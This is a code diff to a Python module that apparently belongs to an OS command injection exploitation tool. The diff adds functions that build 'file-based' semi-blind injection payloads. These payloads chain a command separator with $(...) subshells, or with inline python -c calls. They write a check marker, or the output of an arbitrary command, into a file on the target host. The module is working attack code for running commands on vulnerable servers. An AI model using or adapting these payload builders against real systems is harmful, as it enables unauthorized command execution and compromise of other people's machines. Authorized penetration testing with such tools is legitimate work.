@@ -15,25 +15,48 @@
 """
 
 """
-    The "file-based" technique on Semiblind-based OS Command Injection.
+  The "file-based" technique on Semiblind-based OS Command Injection.
   The available "file-based" payloads.
 """
 
+# ----------------------------------------------------------
 # File-based decision payload (check if host is vulnerable). 
+# ----------------------------------------------------------
 def decision(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE):
   
   payload = (separator + " " +
-	     "$(echo " + B64_ENC_TAG + "" + B64_DEC_TRICK + " > " + OUTPUT_TEXTFILE + ")"
+	    "$(echo " + B64_ENC_TAG + "" + B64_DEC_TRICK + " > " + OUTPUT_TEXTFILE + ")"
 	    ) 
   
   return payload
 
+"""
+__Warning__: The alternative shells are still experimental.
+"""
+def decision_alter_shell(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE):
+  payload = (separator + " " + 
+	    "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('"+ B64_ENC_TAG + "" + B64_DEC_TRICK + "')\")"
+	     ) 
 
+  return payload
+
+# ---------------------------------------------
 # Execute shell commands on vulnerable host.
+# ---------------------------------------------
 def cmd_execution(separator,cmd,OUTPUT_TEXTFILE):
   
   payload = (separator +
 	     "echo $(" + cmd + " > " + OUTPUT_TEXTFILE + ")" 
 	    )
 
+  return payload
+
+"""
+__Warning__: The alternative shells are still experimental.
+"""
+def cmd_execution_alter_shell(separator,cmd,OUTPUT_TEXTFILE):
+  payload = (separator + 
+	    "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\")"
+	    )
+  
   return payload
